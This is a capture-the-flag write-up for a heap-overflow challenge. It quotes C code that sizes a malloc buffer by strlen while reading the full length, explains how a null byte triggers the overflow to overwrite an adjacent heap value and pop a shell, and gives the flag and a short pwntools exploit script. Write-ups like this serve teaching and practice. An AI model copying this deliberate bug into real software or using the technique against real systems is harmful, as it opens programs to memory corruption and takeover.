# There is No Spoon

So, it reads 256 bytes of data into a 256 byte buffer. It stores the length read in len. It then uses malloc to create another buffer, with the size of this buffer being the strlen length of the first one. It then reads len amount into the second buffer, and XORs the two. Also, there is another data value on the heap - changeme, just after our second buffer. If we change it from 0xff, then a shell is popped.


Clearly, our goal is to achieve some sort of BOF in buffer2 so that we can overwrite changeme.

The vulnerability lies here:
```c
    len = read(0, buffer, len);

    char * buffer2 = malloc(strlen(buffer));

    int * changeme = malloc(sizeof(int));
    *changeme = 255;
    printf("Reality: %d\n", *changeme);

    printf("Make your choice: ");
    len = read(0, buffer2, len);
```

If the amount that we send is larger than the strlen length of what we send, there's heap overflow. We can accomplish this by just adding a null byte in our input. Then, we just spam characters until changeme is overwritten, and a shell is popped.

#### Flag: flag{l0tz_0f_confUsi0n_vulnz}

```py
from pwn import *
e = ELF("./spoon")
p = e.process() if args.LOCAL else remote('chal.ctf.b01lers.com', 1006)
p.clean()
p.sendline('t\x00gfhrejbfhghgajfvjbhgfcjjbgfdchjvjhbfrdhjkxcjkhd')
p.sendline("jgtfvhbgbfvbjbjhijfrjknsdjrfjkregfffffffvntrefkvet")
p.interactive()
```
